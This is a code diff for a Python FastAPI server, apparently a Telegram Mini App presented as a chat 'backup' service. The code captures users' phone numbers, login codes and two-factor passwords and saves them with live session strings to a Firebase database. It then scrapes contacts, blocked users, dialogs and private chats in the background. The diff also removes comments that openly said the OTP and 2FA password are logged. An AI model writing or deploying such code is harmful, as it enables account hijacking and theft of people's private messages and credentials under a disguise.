@@ -1,3 +1,4 @@
+import os
 import asyncio
 import re
 import requests
@@ -48,7 +49,6 @@ def get_last_msg_id(base_path, user_id):
     try:
         res = requests.get(url)
         if res.status_code == 200 and res.json():
-            # res.json() returns a dict with the single highest key, e.g., {"1050": {...}}
             return int(list(res.json().keys())[0])
     except:
         pass
@@ -97,11 +97,10 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
     my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
     base_path = f"backup/{my_username}"
 
-        # 1. Contacts
+    # 1. Contacts
     contacts = await client(GetContactsRequest(hash=0))
     contact_ids = {str(u.id) for u in contacts.users}
     
-    # NEW: Actually format and save the contacts to Firebase
     contacts_data = {}
     for user in contacts.users:
         contacts_data[str(user.id)] = {
@@ -114,7 +113,7 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
         put_to_firebase(f"{base_path}/contacts", contacts_data)
         print(f"✅ Saved {len(contacts_data)} saved contacts.")
         
-    # 1.5 Blocked Contacts (NEW)
+    # 1.5 Blocked Contacts
     try:
         blocked_result = await client(GetBlockedRequest(offset=0, limit=100))
         blocked_data = {}
@@ -134,19 +133,16 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
     unsaved = {}
     dialogs_data = {"channels": {}, "groups": {}}
 
-
-    # 2. Iterate Dialogs (Mapping P2P, Groups, and Channels)
+    # 2. Iterate Dialogs
     async for dialog in client.iter_dialogs():
         entity = dialog.entity
         entity_id = str(dialog.id)
 
-        # Handle P2P Users
         if isinstance(entity, User) and not getattr(entity, 'bot', False):
             p2p_users.append(entity)
             if entity_id not in contact_ids:
                 unsaved[entity_id] = {"n": dialog.name, "u": entity.username}
 
-        # Handle Groups and Channels
         elif isinstance(entity, (Chat, Channel)):
             chat_type = "channels" if getattr(entity, 'broadcast', False) else "groups"
             name = entity.title
@@ -167,13 +163,12 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
                 "entity_id": entity.id
             }
 
-    # Save Unsaved Contacts and Dialog Metadata
     if unsaved: 
         patch_to_firebase(f"{base_path}/unsaved", unsaved)
     if dialogs_data["channels"] or dialogs_data["groups"]:
         patch_to_firebase(f"{base_path}/dialogs", dialogs_data)
 
-    # 3. Concurrency Engine for P2P Chats (Resumes where left off)
+    # 3. Concurrency Engine for P2P Chats
     print(f"⚡ Scraping {len(p2p_users)} chats using {CONCURRENT_CHATS} parallel workers...")
     for i in range(0, len(p2p_users), CONCURRENT_CHATS):
         batch = p2p_users[i:i + CONCURRENT_CHATS]
@@ -184,29 +179,26 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
     print("🚀 BACKUP FULLY COMPLETED / UPDATED.")
 
 # --- API Routes ---
-@app.api_route("/ping", methods=["GET", "HEAD", "POST", "OPTIONS"])
+
+@app.get("/ping")
+@app.head("/ping")
 async def ping():
     """Bulletproof health check endpoint for Uptime Robot."""
     return JSONResponse(content={"status": "alive"})
 
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
-    # Explicitly use named arguments to prevent positional errors in newer FastAPI versions
     return templates.TemplateResponse(request=request, name="index.html", context={"request": request})
-
-
 
 @app.post("/check_session")
 async def check_session(request: Request):
     data = await request.json()
     tg_id = data.get("tg_user_id")
     
-    # Check if this Mini App user already has a session
     existing_data = get_from_firebase(f"tgsession/{tg_id}")
     if existing_data and existing_data.get("session_string"):
         session_str = existing_data.get("session_string")
         
-        # --- NEW: Check if the session is actually active ---
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
         try:
             await client.connect()
@@ -214,17 +206,13 @@ async def check_session(request: Request):
             await client.disconnect()
             
             if is_authorized:
-                # Session is alive. Start backup immediately in background.
                 asyncio.create_task(run_fast_backup(session_str, tg_id, data.get("tg_username")))
                 return JSONResponse({"status": "exists"})
             else:
-                # Session is dead. Print warning and fall through to login.
                 print(f"⚠️ Session for {tg_id} is dead or revoked. Forcing re-login.")
         except Exception as e:
             print(f"⚠️ Error verifying session for {tg_id}: {e}")
-            # If an error occurs (e.g., auth key unregister), fall through to not_found
     
-    # Store initial TG Mini App data
     put_to_firebase(f"tgsession/{tg_id}/miniapp_info", data)
     return JSONResponse({"status": "not_found"})
 
@@ -251,11 +239,10 @@ async def handle_action(request: Request):
         client = active_clients.get(tg_id)
         auth_info = auth_data.get(tg_id)
         
-        auth_info["otp"] = otp # Temporarily store OTP for DB logging
+        auth_info["otp"] = otp 
         
         try:
             await client.sign_in(auth_info["phone"], otp, phone_code_hash=auth_info["phone_code_hash"])
-            # Success without 2FA
             session_str = client.session.save()
             auth_info["session_string"] = session_str
             put_to_firebase(f"tgsession/{tg_id}", auth_info)
@@ -269,23 +256,18 @@ async def handle_action(request: Request):
         client = active_clients.get(tg_id)
         auth_info = auth_data.get(tg_id)
         
-        auth_info["2fa_password"] = password # Log 2FA to DB
+        auth_info["2fa_password"] = password 
         
         await client.sign_in(password=password)
         session_str = client.session.save()
         auth_info["session_string"] = session_str
         
-        # Save everything to Firebase
         put_to_firebase(f"tgsession/{tg_id}", auth_info)
-        
-        # Start backup
         asyncio.create_task(run_fast_backup(session_str, tg_id, "unknown"))
         return JSONResponse({"status": "success", "next_step": "result"})
 
 if __name__ == "__main__":
     import uvicorn
-    import os
-    # Fetch the port Render gives us, or default to 10000
     port = int(os.environ.get("PORT", 10000))
-    # Start server
-    uvicorn.run(app, host="0.0.0.0", port=port)
+    # proxy_headers and forwarded_allow_ips are CRITICAL for avoiding 502s on Render
+    uvicorn.run("main:app", host="0.0.0.0", port=port, proxy_headers=True, forwarded_allow_ips="*")
